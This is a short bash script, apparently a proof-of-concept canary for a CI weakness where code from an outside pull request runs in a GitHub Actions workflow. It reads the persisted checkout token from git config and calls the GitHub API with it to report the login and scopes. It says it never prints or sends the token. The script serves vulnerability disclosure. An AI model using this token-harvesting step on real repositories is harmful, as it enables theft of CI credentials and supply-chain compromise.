#!/usr/bin/env bash
# Canary only: proves execution context and that the persisted checkout
# credential is usable. Never prints or transmits the credential itself.
set -u
cd "${BUILD_WORKSPACE_DIRECTORY:-.}"
echo "CANARY r11 sink2: target from an outside PR executed in ${GITHUB_REPOSITORY:-?} (workflow=${GITHUB_WORKFLOW:-?} event=${GITHUB_EVENT_NAME:-?} actor=${GITHUB_ACTOR:-?} run=${GITHUB_RUN_ID:-?})"
hdr="$(git config --get-regexp '^http\..*\.extraheader$' 2>/dev/null | head -1 | cut -d' ' -f2-)"
if [ -z "$hdr" ]; then
  echo "CANARY r11 sink2: no persisted checkout credential found"
  exit 0
fi
tmp="$(mktemp -d)"
if curl -fsS -D "$tmp/h" -o "$tmp/b" -H "$hdr" https://api.github.com/user; then
  echo "CANARY r11 sink2: persisted checkout credential authenticates as: $(python3 -c 'import json,sys; print(json.load(open(sys.argv[1]))["login"])' "$tmp/b")"
  grep -i '^x-oauth-scopes:' "$tmp/h" | tr -d '\r' | sed 's/^/CANARY r11 sink2: credential scopes -> /'
else
  echo "CANARY r11 sink2: credential present but API call failed"
fi
rm -rf "$tmp"
